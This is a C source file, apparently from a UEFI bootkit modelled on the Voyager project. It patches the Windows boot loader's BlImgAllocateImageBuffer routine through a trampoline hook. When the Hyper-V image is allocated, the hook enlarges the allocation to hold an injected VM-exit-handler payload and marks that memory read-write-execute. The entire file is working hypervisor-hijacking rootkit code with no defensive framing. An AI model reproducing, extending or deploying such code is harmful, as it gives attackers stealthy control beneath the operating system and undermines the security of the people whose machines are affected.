#include "Compiler.h"
#include "ExtendedHv.h"
#include "WinDefines.h"

// Imports
extern VOID EFIAPI SerialPrint(IN CONST CHAR8 *format, ...);
extern VOID EFIAPI SerialPrintHex(IN CONST CHAR8 *label, IN UINT64 value);
extern EFI_STATUS InstallPatch(volatile patchinfo_t *info, void *originalFunction, void *targetFunction);
extern UINT64 PatchSizeVmExitHandler(VOID);

// Public Globals
BOOLEAN gExtendedAllocation = FALSE;
patchinfo_t gBlImgAllocateImageBufferPatchInfo;

// Public Functions
EFI_STATUS InstallPatch_BlImgAllocateImageBuffer(IN VOID *originalFunction);

// Private Globals
// None

// Private Functions
// None

// Private Functions
static UINT64 EFIAPI PatchedBlImgAllocateImageBuffer(
  VOID** imageBuffer, 
  UINTN imageSize, 
  UINT32 memoryType, 
  UINT32 attributes, 
  VOID* unknown1, 
  VOID* unknown2
);

// Implementation

EFI_STATUS InstallPatch_BlImgAllocateImageBuffer(IN VOID *originalFunction) {
  EFI_STATUS status;
  
  SerialPrint("[*] Installing BlImgAllocateImageBuffer patch\n");
  SerialPrintHex("  Target", (UINT64)originalFunction);
  
  status = InstallPatch(
    &gBlImgAllocateImageBufferPatchInfo, 
    originalFunction, 
    PatchedBlImgAllocateImageBuffer
  );
  
  if (EFI_ERROR(status)) {
    SerialPrint("[!] InstallPatch failed: %r\n", status);
  } else {
    SerialPrint("[+] BlImgAllocateImageBuffer patch installed\n");
  }
  
  return status;
}

static UINT64 EFIAPI PatchedBlImgAllocateImageBuffer(
  VOID** imageBuffer, 
  UINTN imageSize, 
  UINT32 memoryType, 
  UINT32 attributes, 
  VOID* unknown1, 
  VOID* unknown2
) {
  //
  // NOTE: Apparently you have to patch the second allocation, I have only seen
  //       voyager do this and so far i can see no difference when I remove
  //       the gExtendedAllocation. It could be worth trying to catch the second
  //       HV_IMAGE allocation to extend instead.
  //
  // reference: https://github.com/backengineering/Voyager/blob/master/Voyager/Voyager/WinLoad.c
  // 

  //
  // Check if this is the hypervisor image allocation
  // The hypervisor has a specific attribute value
  //
  if (attributes == ATTRIBUTE_HV_IMAGE && !gExtendedAllocation) {
    UINTN payloadSize = PatchSizeVmExitHandler();

    //
    // Extend allocation to include our payload
    //
    imageSize += payloadSize;
    
    //
    // Change memory type to RWX
    // This ensures our payload code can execute
    //
    memoryType = MEMORY_ATTRIBUTE_RWX;
    
    //
    // Set flag to prevent extending multiple times
    //
    gExtendedAllocation = TRUE;
  }
  
  //
  // Call original function via trampoline
  //
  const UINT64 result = 
    (
      (UINT64 (EFIAPI *)(VOID**, UINTN, UINT32, UINT32, VOID*, VOID*))
      gBlImgAllocateImageBufferPatchInfo.trampoline
    )
    (imageBuffer, imageSize, memoryType, attributes, unknown1, unknown2)
  ;
  
  return result;
}
